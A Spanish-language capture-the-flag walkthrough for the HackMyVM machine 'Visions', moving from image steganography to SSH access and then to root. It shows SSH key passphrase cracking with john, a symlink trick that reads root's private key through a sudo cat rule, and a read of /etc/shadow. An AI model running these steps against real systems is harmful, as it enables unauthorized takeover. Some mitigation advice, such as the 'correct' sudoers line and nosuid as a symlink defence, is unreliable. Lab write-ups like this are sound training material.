@@ -1,0 +1,409 @@
+---
+title: Visions
+description: Resolución completa de la máquina virtual *Visions* de HackMyVM, enfocada en esteganografía, exposición de credenciales y escalada mediante enlaces simbólicos.
+---
+
+## Introducción
+
+Este documento detalla la metodología y procedimiento completo para comprometer la máquina **Visions**, desarrollada por *sml* para HackMyVM y clasificada con dificultad **Beginner**. Esta máquina presenta un escenario donde técnicas de esteganografía y mala configuración de permisos sudo permiten una escalada de privilegios progresiva hasta alcanzar acceso root.
+
+La resolución sigue una metodología estructurada:
+
+1. **Reconocimiento:** Enumeración de servicios y descubrimiento de información oculta en imágenes.
+2. **Explotación:** Análisis forense digital con esteganografía y extracción de credenciales.
+3. **Escalada de privilegios:** Abuso de permisos sudo y explotación de enlaces simbólicos para acceso root.
+
+El entorno de prueba fue desplegado en VirtualBox utilizando una imagen OVA proporcionada por HackMyVM, simulando vulnerabilidades reales en sistemas Linux.
+
+---
+
+## Información Técnica
+
+| Atributo       | Valor            |
+|----------------|------------------|
+| **Nombre**     | Visions          |
+| **Autor**      | sml              |
+| **Dificultad** | Beginner         |
+| **Fecha**      | 19/04/2021       |
+| **Plataforma** | HackMyVM         |
+| **Formato**    | Imagen OVA       |
+| **IP Objetivo**| 192.168.100.170  |
+
+![Información de la máquina](https://res.cloudinary.com/dewqswzke/image/upload/v1766969619/Info_tcxhf9.png)
+
+*Figura 1: Página de información de la máquina Visions en HackMyVM*
+
+---
+
+## Fase 1 — Despliegue y Configuración
+
+### 1.1 Descarga y Preparación
+Descargamos la máquina desde HackMyVM:
+
+```bash
+# Accedemos a la página de descarga
+# https://hackmyvm.eu/machines/machine.php?vm=Visions
+
+# Descargamos el archivo OVA
+wget [URL_DESCARGA_OVA] -O Visions.ova
+```
+
+### 1.2 Importación en VirtualBox
+Importamos la imagen OVA en VirtualBox:
+
+```bash
+# Desde interfaz gráfica o línea de comandos
+VBoxManage import Visions.ova --vsys 0 --vmname Visions
+```
+
+### 1.3 Configuración de Red
+Configuramos la máquina para red NAT/Host-Only según sea necesario y la iniciamos:
+
+```bash
+VBoxManage startvm Visions --type headless
+```
+
+### 1.4 Identificación de la IP
+Una vez iniciada la máquina, obtenemos la dirección IP asignada:
+
+```
+Dirección IP objetivo: 192.168.100.170
+```
+
+### 1.5 Organización del Workspace
+Creamos una estructura organizada para documentar el proceso:
+
+```bash
+mkdir -p Visions/{content,exploits,nmap,web,scripts}
+cd Visions
+```
+
+---
+
+## Fase 2 — Reconocimiento
+
+### 2.1 Escaneo de Puertos
+Ejecutamos un escaneo TCP SYN para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 192.168.100.170 -oG allPorts
+```
+
+**Resultados:**
+- **22/tcp** — SSH (Secure Shell)
+- **80/tcp** — HTTP (Web Server)
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1766969550/Ports_tgbn0m.png)
+
+*Figura 2: Servicios expuestos en la máquina*
+
+### 2.2 Análisis Detallado de Servicios
+Realizamos un escaneo más detallado:
+
+```bash
+nmap -sCV -p22,80 192.168.100.170 -oN detailed_scan.txt
+```
+
+**Hallazgos:**
+- SSH: OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
+- HTTP: Apache/2.4.52 (Ubuntu)
+
+### 2.3 Análisis del Servicio Web
+Accedemos al servicio HTTP en el puerto 80:
+
+```bash
+curl -s http://192.168.100.170/
+```
+
+### 2.4 Enumeración de Directorios Web
+Realizamos un escaneo exhaustivo de directorios:
+
+```bash
+ffuf -u http://192.168.100.170/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -t 100 \
+  -fc 404
+```
+
+**Resultados obtenidos:**
+- `/index.html` — Página principal
+- `/white.png` — Imagen en formato PNG
+
+### 2.5 Análisis del Código Fuente
+Inspeccionamos el código fuente de la página principal:
+
+```bash
+curl -s http://192.168.100.170/ | html2text
+```
+
+![Comentario en código fuente](https://res.cloudinary.com/dewqswzke/image/upload/v1766969550/Comment_vwqcbj.png)
+
+*Figura 3: Comentario revelando nombre de usuario*
+
+**Hallazgo crítico:** Comentario HTML revela el nombre de usuario `sophia`.
+
+### 2.6 Descarga de Recurso Sospechoso
+Descargamos la imagen identificada:
+
+```bash
+wget http://192.168.100.170/white.png
+```
+
+---
+
+## Fase 3 — Explotación
+
+### 3.1 Análisis Forense de la Imagen
+Realizamos análisis exhaustivo de la imagen `white.png`:
+
+```bash
+# Verificación básica del archivo
+file white.png
+exiftool white.png
+```
+
+### 3.2 Uso de AperiSolve para Análisis Avanzado
+Utilizamos [AperiSolve](https://www.aperisolve.com), una plataforma en línea que aplica múltiples técnicas de esteganografía y análisis forense:
+
+1. **Subimos la imagen** `white.png` a AperiSolve
+2. **Analizamos los resultados** de múltiples herramientas integradas:
+
+**Hallazgos importantes:**
+
+1. **Metadatos EXIF:**
+   ![Metadatos EXIF](https://res.cloudinary.com/dewqswzke/image/upload/v1766969550/Exiftool_kwgoyy.png)
+   *Figura 4: Comentario en metadatos que sugiere una contraseña*
+
+2. **Análisis de capas de imagen:**
+   AperiSolve revela que la imagen contiene información oculta en diferentes capas, incluyendo credenciales para el usuario `sophia`.
+
+**Credenciales extraídas:**
+- Usuario: `sophia`
+- Contraseña: [extraída del análisis de capas]
+
+### 3.3 Acceso Inicial al Sistema
+Utilizamos las credenciales descubiertas para acceder por SSH:
+
+```bash
+ssh sophia@192.168.100.170
+```
+
+![Conexión SSH exitosa](https://res.cloudinary.com/dewqswzke/image/upload/v1766969553/Ssh_qhedn1.png)
+
+*Figura 5: Acceso SSH como usuario sophia*
+
+---
+
+## Fase 4 — Escalada de Privilegios
+
+### 4.1 Enumeración del Sistema como sophia
+Comenzamos la enumeración post-explotación:
+
+```bash
+whoami
+id
+pwd
+ls -la
+```
+
+### 4.2 Verificación de Privilegios Sudo
+```bash
+sudo -l
+```
+
+![Privilegios sudo de sophia](https://res.cloudinary.com/dewqswzke/image/upload/v1766969609/Sudo-l_e2kidv.png)
+
+*Figura 6: Permisos sudo que permiten leer archivo específico*
+
+**Hallazgo:** `(root) /usr/bin/cat /home/isabella/.invisible`
+
+### 4.3 De `sophia` → Lectura de Clave SSH de isabella
+Ejecutamos el comando permitido:
+
+```bash
+sudo cat /home/isabella/.invisible
+```
+
+![Clave SSH privada](https://res.cloudinary.com/dewqswzke/image/upload/v1766969550/Key_rnjtd8.png)
+
+*Figura 7: Clave SSH privada de isabella*
+
+**Contenido obtenido:** Clave SSH privada protegida con passphrase.
+
+### 4.4 Crackeo de la Passphrase SSH
+Guardamos la clave en nuestro sistema local y extraemos el hash:
+
+```bash
+# Copiamos la clave a archivo local
+echo "-----BEGIN OPENSSH PRIVATE KEY-----" > id_rsa_isabella
+echo "[CONTENIDO_DE_LA_CLAVE]" >> id_rsa_isabella
+echo "-----END OPENSSH PRIVATE KEY-----" >> id_rsa_isabella
+
+# Extraemos hash con ssh2john
+ssh2john id_rsa_isabella > isabella_hash.txt
+
+# Ataque de fuerza bruta
+john --wordlist=/usr/share/wordlists/rockyou.txt isabella_hash.txt
+```
+
+![Resultado de John](https://res.cloudinary.com/dewqswzke/image/upload/v1766969550/John_ggc20q.png)
+
+*Figura 8: Passphrase crackeada*
+
+**Passphrase obtenida:** `123456789`
+
+### 4.5 Acceso como isabella
+Utilizamos la clave con la passphrase crackeada:
+
+```bash
+chmod 600 id_rsa_isabella
+ssh -i id_rsa_isabella isabella@192.168.100.170
+# Cuando solicite passphrase: 123456789
+```
+
+### 4.6 De `isabella` → `root`
+
+#### 4.6.1 Análisis de la Situación Actual
+Como isabella, verificamos nuestros privilegios:
+
+```bash
+whoami
+sudo -l
+```
+
+**Observación:** isabella no tiene privilegios sudo directos, pero sophia puede leer `.invisible` en el directorio de isabella.
+
+#### 4.6.2 Creación de Enlace Simbólico Malicioso
+Aprovechamos la capacidad de sophia para leer archivos específicos:
+
+```bash
+# Como isabella, reemplazamos .invisible
+rm /home/isabella/.invisible
+
+# Creamos enlace simbólico a clave SSH de root
+ln -s /root/.ssh/id_rsa /home/isabella/.invisible
+```
+
+#### 4.6.3 Lectura de Clave SSH de Root
+Volvemos a la sesión de sophia y leemos el archivo vinculado:
+
+```bash
+# Desde sesión de sophia
+sudo cat /home/isabella/.invisible
+```
+
+**Resultado:** Obtenemos la clave SSH privada de root.
+
+#### 4.6.4 Acceso Directo como Root
+Guardamos la clave en nuestro sistema:
+
+```bash
+# En máquina atacante
+echo "-----BEGIN OPENSSH PRIVATE KEY-----" > id_rsa_root
+echo "[CLAVE_SSH_ROOT]" >> id_rsa_root
+echo "-----END OPENSSH PRIVATE KEY-----" >> id_rsa_root
+
+chmod 600 id_rsa_root
+ssh -i id_rsa_root root@192.168.100.170
+```
+
+![Acceso root exitoso](https://res.cloudinary.com/dewqswzke/image/upload/v1766969552/Root_to0ues.png)
+
+*Figura 9: Shell como usuario root obtenida*
+
+### 4.7 Verificación Final
+```bash
+id
+whoami
+cat /etc/shadow | head -1
+```
+
+---
+
+## Análisis de Vulnerabilidades
+
+### 5.1 Fallos de Seguridad Identificados
+
+| Vulnerabilidad | Severidad | Impacto | CWE/Referencia |
+|----------------|-----------|---------|----------------|
+| Información sensible en metadatos de imagen | Media | Exposición de pistas/credenciales | CWE-200 |
+| Credenciales ocultas mediante esteganografía débil | Alta | Compromiso de cuentas | CWE-312 |
+| Comentarios en código fuente expuestos | Baja | Revelación de información | CWE-615 |
+| Configuración insegura de sudo (cat específico) | Alta | Lectura arbitraria de archivos | CWE-269 |
+| Claves SSH protegidas con passphrases débiles | Alta | Compromiso de autenticación | CWE-521 |
+| Enlaces simbólicos sin restricciones | Crítica | Escalada de privilegios | CWE-61 |
+| Falta de separación de privilegios adecuada | Media | Propagación de acceso | CWE-250 |
+
+### 5.2 Recomendaciones de Mitigación
+
+1. **Gestión de Metadatos y Esteganografía:**
+   - Limpiar metadatos de archivos antes de publicarlos
+   - Utilizar herramientas como `exiftool` para remover información sensible
+   ```bash
+   exiftool -all= imagen.png
+   ```
+   - Educar a usuarios sobre riesgos de ocultar información en imágenes
+   - Implementar escaneo de contenido oculto en archivos subidos
+
+2. **Protección de Credenciales:**
+   - Evitar almacenar credenciales en imágenes o metadatos
+   - Utilizar sistemas de gestión de secretos centralizados
+   - Implementar autenticación multifactor
+   - Rotar credenciales regularmente
+
+3. **Configuración Segura de Sudo:**
+   - Especificar comandos exactos con argumentos completos
+   - Evitar permisos que permitan lectura arbitraria
+   ```bash
+   # INCORRECTO
+   sophia ALL=(root) /usr/bin/cat /home/isabella/.invisible
+   
+   # CORRECTO (si es necesario)
+   sophia ALL=(root) /usr/bin/cat /home/isabella/.invisible --options-especificas
+   ```
+   - Implementar políticas de mínimo privilegio
+
+4. **Gestión de Claves SSH:**
+   - Utilizar passphrases complejas (mínimo 20 caracteres)
+   - Considerar el uso de certificados SSH en lugar de claves estáticas
+   - Implementar agentes SSH para gestión segura de claves
+   - Rotar claves SSH regularmente
+   ```bash
+   # Generar clave SSH segura
+   ssh-keygen -t ed25519 -a 100 -f nueva_clave
+   ```
+
+5. **Protección contra Enlaces Simbólicos:**
+   - Configurar opciones de montaje con `nosuid` y `nodev`
+   - Utilizar `openat()` con `O_NOFOLLOW` en desarrollos
+   - Implementar políticas que restrinjan enlaces simbólicos en áreas sensibles
+   ```c
+   // Ejemplo en C para evitar symlink attacks
+   fd = open(path, O_RDONLY | O_NOFOLLOW);
+   ```
+
+6. **Hardening del Sistema de Archivos:**
+   - Configurar permisos adecuados en directorios de usuarios
+   - Implementar SELinux/AppArmor para confinamiento
+   - Utilizar sistemas de archivos con capacidades de seguridad mejoradas
+   ```bash
+   # Configurar permisos seguros
+   chmod 700 /home/isabella
+   chmod 600 /home/isabella/.ssh/*
+   ```
+
+7. **Monitoreo y Detección:**
+   - Implementar logging de uso de comandos sudo
+   - Monitorear creación/modificación de enlaces simbólicos
+   - Configurar alertas para accesos no autorizados
+   - Realizar auditorías de seguridad periódicas
+   ```bash
+   # Configurar auditd para monitorear symlinks
+   auditctl -w /home/isabella/.invisible -p wa -k sensitive_symlink
+   ```
+
+8. **Concienciación y Capacitación:**
+   - Capacitar a usuarios en higiene de seguridad digital
+   - Establecer políticas para manejo de información sensible
+   - Realizar ejercicios de respuesta a incidentes
+   - Implementar programas de seguridad para administradores
